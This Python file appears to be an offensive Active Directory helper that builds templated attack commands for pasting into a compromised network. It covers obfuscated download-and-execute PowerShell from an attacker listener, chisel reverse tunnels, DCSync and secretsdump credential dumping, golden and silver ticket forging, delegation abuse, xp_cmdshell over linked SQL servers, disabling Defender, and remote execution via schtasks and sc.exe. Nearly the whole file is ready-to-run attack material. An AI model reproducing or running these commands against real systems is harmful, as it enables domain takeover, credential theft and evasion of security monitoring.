
import string
import random

def random_str(k=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=k))


command = dict()

# Download File
command['Download_File'] = {'windows': ''}
command['Download_File']['windows'] = '''# Default listen ip on tun0, listen port on 80
# certutil.exe
certutil.exe -urlcache -f http://{{listen_ip}}:{{listen_port}}/{{filename}} {{filename}}

# PowerShell
iwr "http://{{listen_ip}}:{{listen_port}}/{{filename}}" -OutFile "{{filename}}"
powershell i`e`x(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/{{filename}});
'''

# chisel
command['chisel'] = {'common': ''}
command['chisel']['common'] = '''# Default listen ip on tun0, listen port on 80
# Chisel reverse - socks on server
sudo ./chisel server -p {{listen_port}} --reverse --socks5
.\chisel.exe client {{listen_ip}}:{{listen_port}} R:socks

# Chisel - socks on client
./chisel server -p 8000 --socks5
.\chisel.exe client {{listen_ip}}:{{listen_port}} 0.0.0.0:1080:socks
'''

# Get-DomainTrust
command['Get-DomainTrust'] = {'windows': ''}
command['Get-DomainTrust'] = {'windows': ''}
command['Get-DomainTrust']['windows'] = '''# PowerView.ps1
iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerView.ps1);
Get-DomainTrust -Domain {{domain}}
Get-DomainTrust -Domain {{target_domain}}'''

# Get-DomainSID
command['Get-DomainSID'] = {'windows': '', 'linux': ''}
command['Get-DomainSID']['windows'] = '''# PowerView.ps1
iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerView.ps1);
Get-DomainSid -Domain {{domain}}
Get-DomainSid -Domain {{target_domain}}'''

command['Get-DomainSID']['linux'] = '''impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0'''

# PowerUpSQL.ps1
command['PowerUpSQL'] = {'windows': ''}
command['PowerUpSQL']['windows'] = '''# PowerUpSQL.ps1
iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerUpSQL.ps1);

# Enum link SQL Server
Get-SQLServerLinkCrawl -Instance {{sqlserver}} | format-table
Get-SQLQuery -Instance {{sqlserver}} -Query "EXEC sp_linkedservers;"

# Query
Get-SQLQuery -Instance {{sqlserver}} -Query "SELECT SYSTEM_USER;"
Get-SQLQuery -Instance {{sqlserver}} -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"

# xp_cmdshell on all link server
Get-SQLServerLinkCrawl -Instance {{sqlserver}} -Query "exec master..xp_cmdshell '{{cmd}}'"

# Escalate to sysadmin
Invoke-SQLEscalatePriv -Verbose -Instance {{sqlserver}}
Get-SQLQuery -Instance {{sqlserver}} -Query "SELECT IS_SRVROLEMEMBER('sysadmin');"

# PrivEsc
Invoke-SQLEscalatePriv -Verbose -Instance {{sqlserver}} 

# Enable xp_cmdshell
Get-SQLQuery -Instance {{sqlserver}} -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"

# Restore xp_cmdshell
Get-SQLQuery -Instance {{sqlserver}} -Query "EXEC sp_configure 'show advanced options', 0; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"

# Check xp_cmdshell
Get-SQLQuery -Instance {{sqlserver}} -Query "sp_configure 'Show Advanced Options'"
Get-SQLQuery -Instance {{sqlserver}} -Query "sp_configure 'xp_cmdshell'"

# Exec xp_cmshell
Invoke-SQLOSCmd -Verbose -Instance {{sqlserver}} -Command "whoami"


# Enum accessible MSSQL Server
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}

# xp_dirtree
Get-SQLQuery -Instance {{sqlserver}} -Query "exec xp_dirtree '\\\\{{listen_ip}}\\file'"
'''

# MSSQL
command['MSSQL'] = {'windows': ''}
command['MSSQL']['windows'] = '''# Connect
mssqlclient.exe {{sqlserver}}

# Check link
EXEC sp_linkedservers;

# Check priv on target
select mylogin from openquery("{{link_sqlserver}}", 'select SYSTEM_USER as mylogin')
select mylogin from openquery("{{link_sqlserver}}", 'select mylogin from openquery("{{link_second}}", ''select SYSTEM_USER as mylogin'')')

# check link on target
EXEC ('sp_linkedservers') AT [{{link_sqlserver}}]
EXEC [{{link_sqlserver}}].master.dbo.sp_linkedservers

# Exec xp_cmdshell on target
EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{{link_sqlserver}}]
EXEC ('EXEC xp_cmdshell ''{{cmd}}'' ') AT [{{link_sqlserver}}]

# Connect to sqlserver -> link_sqlserver -> second_link_server (second link server can be sqlserver)
EXEC ('EXEC (''EXEC sp_linkedservers'') AT [{{link_second}}]') AT [{{link_sqlserver}}]
EXEC ('EXEC (''EXEC sp_configure \'\'\'\'show advanced options\'\'\'\', 1; RECONFIGURE; EXEC sp_configure \'\'\'\'xp_cmdshell\'\'\'\', 1; RECONFIGURE;'') AT [{{third_sqlserver}}]') AT [{{link_sqlserver}}]
EXEC ('EXEC (''EXEC xp_cmdshell \'\'\'\'{{cmd}}\'\'\'\' '') AT [{{link_second}}]') AT [{{link_sqlserver}}]
'''

# BloodHound
command['BloodHound'] = {'common': ''}
command['BloodHound']['common'] = '''# Python
bloodhound-python -u '{{username}}' -p '{{password}}' -c all -d {{domain}} -dc {{dc_host}} -ns {{dns_ip}} --zip 

# Python add "--disable-autogc": Don't automatically select a Global Catalog (use only if it gives errors)
bloodhound-python -u '{{username}}' -p '{{password}}' -c all -d {{domain}} -dc {{dc_host}} -ns {{dns_ip}} --zip  --disable-autogc

# PowerShell (Be sure hosting SharpHound.ps1 on HTTP Server)
iex(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/SharpHound.ps1); Invoke-BloodHound -collectionmethod all -domain {{domain}}
'''


# Golden ticket
command['GoldenTicket'] = {'windows': ''}
command['GoldenTicket']['windows'] = '''{{mimikatz}} "kerberos::golden /User:Administrator /domain:{{domain}} /sid:{{domain_sid}} /krbtgt:{{nthash}} /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
'''

# Dump trust key
command['Dump-TrustKey'] = {'windows': ''}
command['Dump-TrustKey']['windows'] = '''{{mimikatz}} "lsadump::trust /patch"'''

# DCSync
command['dcsync'] = {'windows': '', 'linux': ''}
command['dcsync']['windows'] = '''lsadump::dcsync /domain:{{domain}} /all
{{mimikatz}} "lsadump::dcsync /domain:{{domain}} /user:{{domain}}\krbtgt" "exit"

# PowerShell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:{{domain}} /user:{{domain_short}}\krbtgt"'
'''
command['dcsync']['linux'] = '''impacket-secretsdump -k -no-pass -just-dc {{dc_host}}
impacket-secretsdump -just-dc -hashes {{hashes}} {{domain}}/'{{username}}'@{{dc_ip}}
impacket-secretsdump -just-dc {{domain}}/'{{username}}':'{{password}}'@{{dc_ip}}
impacket-secretsdump -just-dc-user {{target_user}} {{domain}}/'{{username}}':'{{password}}'@{{dc_ip}}
'''

# Unconstrained Delegation
command['Unconstrained_Delegation'] = {'windows': '', 'linux': ''}
command['Unconstrained_Delegation']['windows'] = '''# Enum -Get Unconstrained Delegation computers
Get-DomainComputer -Unconstrained

# Check victim's spoolss service 
ls \\\\{{target_computer}}\pipe\spoolss

# Execute on Unconstrained Delegation computers
{{rubeus}} monitor /interval:5 /filteruser:{{target_computer}}$ /nowrap

SpoolSample.exe {{target_computer}} {{ud_computer}}

{{rubeus}} ptt /ticket:do...{{repleace_here_with_base64_ticket}}

{{mimikatz}} "lsadump::dcsync /domain:{{domain}} /user:{{domain_short}}\krbtgt" "exit"
'''

command['Unconstrained_Delegation']['linux'] = '''# Refer: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/kerberos/delegation-abuse/kud
# 1. 取得 unconstrained delegation 帳戶的 hash
impacket-secretsdump {{domain}}/'{{username}}':'{{password}}'@{{ud_computer}}  

# 2. 加入 SPN (使用 https://github.com/dirkjanm/krbrelayx)
python addspn.py -u '{{domain}}\{{ud_computer}}$' -p aad3b435b51404eeaad3b435b51404ee:{{ud_nthash}} -s HOST/kali.{{domain}} {{dc_host}}
# 噴錯的話加上 --additional
python addspn.py -u '{{domain}}\{{ud_computer}}$' -p aad3b435b51404eeaad3b435b51404ee:{{ud_nthash}} -s HOST/kali.{{domain}} {{dc_host}} --additional

# 3. 設定 DNS，將
python dnstool.py -u '{{domain}}\{{ud_computer}}$' -p aad3b435b51404eeaad3b435b51404ee:{{ud_nthash}} -r kali.{{domain}} -d {{kali_ip}} --action add {{dc_host}}

# 4. 確認 DNS 設定成功 (need to wait for a miniute)
nslookup kali.{{domain}} {{dc_ip}}

# 5. 監聽，使用 unconstrained delegation account 的 aes256-cts-hmac-sha1-96 hash
sudo python krbrelayx.py -aesKey {{aes_key}}

# 6. 觸發 printerbug ("kali" can be ud_computer)
python printerbug.py '{{domain}}/{{ud_computer}}$'@{{dc_host}} -hashes aad3b435b51404eeaad3b435b51404ee:{{ud_nthash}} kali

# 7. 匯出 ccache
export KRB5CCNAME={{replace_here}}_krbtgt@CORP.COM.ccache

# 8. DCSync
impacket-secretsdump {{dc_host}} -k -no-pass -just-dc
'''

command['Constrained_Delegation_with_protocol_transition'] = {'windows': '', 'linux': ''}

command['Constrained_Delegation_with_protocol_transition']['windows'] = '''

# PowerView.ps1
Get-DomainUser -TrustedToAuth

# Get TGT and Get service ticket
{{rubeus}} s4u /user:{{cd_username}} /rc4:{{nthash}} /impersonateuser:administrator /msdsspn:{{spn}} /ptt

# Try to access service
mssqlclient.exe {{hostname}}
dir \\\\{{hostname}}\\c$  # Use hostname, don't use IP

# Replace servicen name
{{rubeus}} s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
'''

command['Constrained_Delegation_with_protocol_transition']['linux'] = '''# findDelegation 
impacket-findDelegation -target-domain {{domain}} -dc-ip {{dc_ip}} {{domain}}/'{{username}}':'{{password}}'

# Get TGT using the account with constrained delegation (Choose one)
impacket-getTGT {{domain}}/'{{cd_username}}' -hashes :{{nthash}} -dc {{dc_ip}}
impacket-getTGT {{domain}}/'{{cd_username}}':'{{cd_password}}' -dc {{dc_ip}}

# export TGT
export KRB5CCNAME='{{cd_username}}.ccache'

# SPN e.g. mssqlsvc/sql01.corp.com:1433
impacket-getST -spn {{spn}} -impersonate administrator {{domain}}/'{{cd_username}}' -k -no-pass

# export service ticket
export KRB5CCNAME=administrator.ccache

# Try to access target
impacket-mssqlclient -k {{hostname}}
impacket-smbclient -k {{hostname}}
'''

command['Constrained_Delegation_without_protocol_transition'] = {'linux': ''}

command['Constrained_Delegation_without_protocol_transition']['linux'] = '''# add computer X (rbcd_const)
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host {{dc_ip}} '{{domain}}/{{username}}:{{password}}'

# add rbcd from X (rbcd_const) to constrained (constrained_computer)
rbcd.py -delegate-from 'rbcd_const$' -delegate-to '{{cd_computer}}$' -dc-ip {{dc_ip}} -action 'write' -hashes ':{{nthash}}' {{domain}}/'{{cd_computer}}$'


# Method 1 (s4u2self + s4u2proxy)
# s4u2self on X (rbcd_const)
impacket-getST -self -impersonate "administrator" -dc-ip {{dc_ip}}  {{domain}}/'rbcd_const$':'rbcdpass'
# s4u2proxy from X (rbcd_const) to constrained (constrained_computer). The value for '-additional-ticket' is obtained from the result of s4u2self.
impacket-getST -impersonate "administrator" -spn "host/{{cd_computer}}" -additional-ticket 'administrator@rbcd_const$@{{domain}}.ccache' -dc-ip {{dc_ip}}  {{domain}}/'rbcd_const$':'rbcdpass'

# Method 2 (s4u2self + s4u2proxy)
impacket-getST -spn 'host/{{cd_computer}}' -impersonate Administrator -dc-ip {{dc_ip}} {{domain}}/'rbcd_const$':'rbcdpass'


# And launch the s4uProxy with the forwardable ticket
# s4u2proxy from constrained (constrained_computer) to target (target) - with altservice to change the SPN in use. The value for '-additional-ticket' is obtained from the result of s4u2proxy.
impacket-getST -impersonate "administrator" -spn "{{service}}/{{target}}" -altservice "cifs/{{target}}" -additional-ticket 'administrator@host_{{cd_computer}}@{{domain}}.ccache' -dc-ip {{dc_ip}} -hashes ':{{nthash}}' {{domain}}/'{{cd_computer}}$'

# export the tieckt from s4uProxy
export KRB5CCNAME=administrator@cifs_{{target}}@{{domain}}.ccache

impacket-wmiexec -k -no-pass {{domain}}/administrator@{{target}}

Ref: https://mayfly277.github.io/posts/GOADv2-pwning-part10/#without-protocol-transition
'''



# RBCD
command['rbcd_Resource_Based_Constrained_Delegation'] = {'windows': '','linux': ''}
evil_computer = random_str(6)
command['rbcd_Resource_Based_Constrained_Delegation']['windows'] = '''# PowerView.ps1
# Find current user's permission on all computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
# Find who has GenericWrite permission on which computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | select Identity, AceType, ObjectDN

# Load tools
i`e`x(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/Powermad.ps1);
i`e`x(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/Rubeus.ps1);
i`e`x(iWr -UsEbaSIcparSING http://{{listen_ip}}:{{listen_port}}/PowerView.ps1);

# add computer
New-MachineAccount -MachineAccount '{{evil_computer}}' -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)

# (Skip if current user have GenericWrite right) Create a powershell with the user has GenericWrite right
Invoke-Rubeus asktgt /user:'{{username}}' /rc4:{{nthash}} /createnetonly:powershell.exe /show

# Insert evilcomputer sid to target computer 
$sid = Get-DomainComputer -Identity '{{evil_computer}}' -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

Get-DomainComputer -Identity '{{target_computer}}' | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# check msds-allowedtoactonbehalfofotheridentity on target computer
$RBCDbytes = Get-DomainComputer {{target_computer}} -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}

# Get TGT and ST. rc4 is 'Passw0rd!'
Invoke-Rubeus s4u /user:'{{evil_computer}}$' /rc4:fc525c9683e8fe067095ba2ddc971889 /impersonateuser:administrator /msdsspn:CIFS/{{target_computer}}.{{domain}} /ptt
'''.replace('{{evil_computer}}', evil_computer)


command['rbcd_Resource_Based_Constrained_Delegation']['linux']  = '''# PowerView.ps1
# Find current user's permission on all computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
# Find who has GenericWrite permission on which computer
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' } | select Identity, AceType, ObjectDN

# Check MachineAccountQuota
Get-DomainObject -Identity corp -Properties ms-DS-MachineAccountQuota

# New a computer (Choose one)
impacket-addcomputer -dc-ip {{dc_ip}} -computer-name '{{evil_computer}}$' -computer-pass 'Passw0rd!' {{domain}}/'{{username}}':'{{password}}'
impacket-addcomputer -dc-ip {{dc_ip}} -computer-name '{{evil_computer}}$' -computer-pass 'Passw0rd!' {{domain}}/'{{username}}' -hashes :{{nthash}}

# Asign the new computer sid to rbcd computer (Choose one)
impacket-rbcd -dc-ip {{dc_ip}} -action write -delegate-from '{{evil_computer}}$' -delegate-to '{{target_computer}}$' {{domain}}/'{{username}}':'{{password}}'
impacket-rbcd -dc-ip {{dc_ip}} -action write -delegate-from '{{evil_computer}}$' -delegate-to '{{target_computer}}$' {{domain}}/'{{username}}' -hashes :{{nthash}}

# clear KRB5CCNAME
unset KRB5CCNAME

# Get ST on rbcd computer
impacket-getST -dc-ip {{dc_ip}} -impersonate Administrator -spn cifs/{{target_computer}} '{{domain}}/{{evil_computer}}$:Passw0rd!'
export KRB5CCNAME=Administrator.ccache

# Try to access rbcd computer
impacket-smbexec -k -no-pass '{{target_computer}}' -debug'''.replace('{{evil_computer}}', evil_computer)



# to_parent_domain_using_krbtgt
command['to_parent_domain_using_krbtgt'] = {'windows': '', 'linux': ''}
command['to_parent_domain_using_krbtgt']['windows'] = '''# Enum - Get krbtgt hash
lsadump::dcsync /domain:{{current_domain}} /user:{{current_domain}}\krbtgt

# Enum - Get Doamin SID
Get-DomainSID -Domain {{current_domain}}
Get-DomainSID -Domain {{target_domain}}

# Golden ticket
Mimikatz.exe "kerberos::golden /user:glodenuser /domain:{{current_domain}} /sid:{{current_domain_sid}} /krbtgt:{{current_domain_krbtgt_nthash}} /sids:{{target_sid}}-519 /ptt" "exit"

# Try to access target
dir \\\\{{target_domain}}\\c$
'''


command['to_parent_domain_using_krbtgt']['linux'] = '''# Enum - Get krbtgt hash
impacket-secretsdump {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} -just-dc-user {{domain_short}}/krbtgt
impacket-secretsdump -just-dc -hashes {{hashes}} {{domain}}/'{{username}}'@{{dc_host}}

# Enum - Get Domain SID
impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
impacket-lookupsid -domain-sids {{domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0

# Golden ticket
impacket-ticketer -nthash {{current_domain_krbtgt_nthash}} -domain-sid {{current_domain_sid}} -domain {{current_domain}}  -extra-sid {{target_sid}}-519 goldenuser

# Export ccache
export KRB5CCNAME=goldenuser.ccache

# Try to access smb on target
impacket-smbclient -k -no-pass {{current_domain}}/goldenuser@{{target_dc_host}} -debug 
'''


# To parent domain using trustkey
command['to_parent_domain_using_trustkey'] = {'windows': '', 'linux': ''}
command['to_parent_domain_using_trustkey']['windows'] = '''# Enum
Get-DomainSid -Domain {{domain}}
Get-DomainSid -Domain {{target_domain}}

# Enum - Choose one
{{mimikatz}} "lsadump::trust /patch"
{{mimikatz}} "lsadump::dcsync /domain:{{domain}} /user:{{trust_account}}" "exit"

# Method 1: Mimikatz.exe + Rubeus.exe
{{mimikatz}} "Kerberos::golden /user:Administrator /domain:{{current_domain}} /sid:{{current_domain_sid}} /sids:{{target_domain_sid}}-519 /rc4:{{trust_key}} /service:krbtgt /target:{{target_domain}} /ticket:{{ticket}}" "exit"
{{rubeus}} asktgs /ticket:{{ticket}} /service:cifs/{{target_dc_host}} /dc:{{target_dc_host}} /ptt

# Method 2: Only use Rubeus.exe
{{rubeus}} silver /user:administrator /domain:{{current_domain}} /service:krbtgt/{{target_domain}} /sid:{{current_domain_sid}} /rc4:{{trust_key}} /sids:{{target_domain_sid}}-519 /outfile:{{ticket}} /nowrap
{{rubeus}} asktgs /service:cifs/{{target_dc_host}}  /dc:{{target_dc_host}} /ptt /ticket:{{ticket}}
'''

command['to_parent_domain_using_trustkey']['linux'] = '''# Enum
impacket-lookupsid -domain-sids {{current_domain}}/'{{username}}':'{{password}}'@{{dc_host}} 0
impacket-lookupsid -domain-sids {{current_domain}}/'{{username}}':'{{password}}'@{{target_dc_host}} 0
impacket-secretsdump -just-dc-user '{{trust_account}}' {{domain}}/'{{username}}':'{{password}}'@{{dc_host}}

# Make the ticket
impacket-ticketer -nthash {{trust_key}} -domain-sid {{current_domain_sid}} -domain {{current_domain}} -extra-sid {{target_domain_sid}}-519 -spn krbtgt/{{target_domain}} trustfakeuser
export KRB5CCNAME=trustfakeuser.ccache
impacket-getST -k -no-pass -spn cifs/{{target_dc_host}} {{target_domain}}/trustfakeuser@{{target_domain}} -debug
export KRB5CCNAME=trustfakeuser@{{target_domain}}.ccache
impacket-smbexec -k -no-pass {{target_dc_host}}
'''

# Cross Forest using Extra SID
command['cross_forest_with_extraSID'] = {'windows': '', 'linux': ''}
command['cross_forest_with_extraSID']['windows'] = '''# Check Trust (TrustAttributes in the output result needs to have TREAT_AS_EXTERNAL)
Get-DomainTrust -Domain {{forest_domain}}

# [Skip if you are root domain adminitrator] Get Domain SID
Get-DomainSid -Domain {{domain}}
Get-DomainSid -Domain {{target_domain}}

# 如果現在在 subdomain，要先取得 root domain 的 krbtgt hash
{{mimikatz}} "kerberos::golden /user:nouser /domain:{{domain}} /sid:{{domain_sid}} /sids:{{target_domain_sid}}-519 /krbtgt:{{nthash}} /ptt" "exit"

# Dump krbtgt NTLM hash in root domain
{{mimikatz}} "lsadump::dcsync /domain:{{target_domain}} /user:{{target_domain}}\krbtgt" "exit"

# Check trust (Choose RID >= 1000 in output as forest_extra_sid)
Get-DomainGroupMember -Identity "Administrators" -Domain {{forest_domain}}

# Golden ticket for root domain Enterprise Admins
{{mimikatz}} "kerberos::golden /user:h4x /domain:{{target_domain}} /sid:{{target_domain_sid}} /krbtgt:{{target_domain_krbtgt_nthash}} /sids:{{forest_extra_sid}} /ptt" "exit"

# Enjoy yourself
dir \\\\{{forest_dc_host}}\c$
PsExec.exe \\\\{{forest_dc_host}} cmd
'''



# schtasks
command['schtasks'] = {'windows': ''}
taskname = 'task_' + random_str(6)
command['schtasks']['windows'] = '''

# 確認權限
schtasks /S {{hostname}}

# 新增 task (choose 32 bit or 64 bit depending on target)
schtasks /create /F /S {{hostname}} /SC Weekly /RU "NT Authority\SYSTEM" /TN "{{taskname}}" /TR "{{cmd}}"

# 確認新增
schtasks /query /S {{hostname}}

# 執行
schtasks /Run /F /S {{hostname}} /TN "{{taskname}}"

# Using username and passowrd
schtasks /create /F /S {{hostname}} /TN {{taskname}} /TR {{cmd}} /SC Weekly /U {{username}} /P {{password}}
schtasks /run /F /S {{hostname}} /tn {{taskname}} /U {{username}} /P {{password}}
schtasks /delete /S {{hostname}} /F /TN {{taskname}} 
'''.replace('{{taskname}}', taskname)


# schtasks
command['disable_defender'] = {'windows': ''}
command['disable_defender']['windows'] = '''Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
'''

# SC.exec
command['sc'] = {'windows': ''}
servicename = 'SERVICE_' + random_str(6)
command['sc']['windows'] = '''
sc.exe \\\\{{hostname}} create {{servicename}} displayname=NAME binpath="{{cmd}}" start=demand
sc.exe \\\\{{hostname}} start {{servicename}}
sc.exe \\\\{{hostname}} delete {{servicename}}
'''.replace('{{servicename}}', servicename)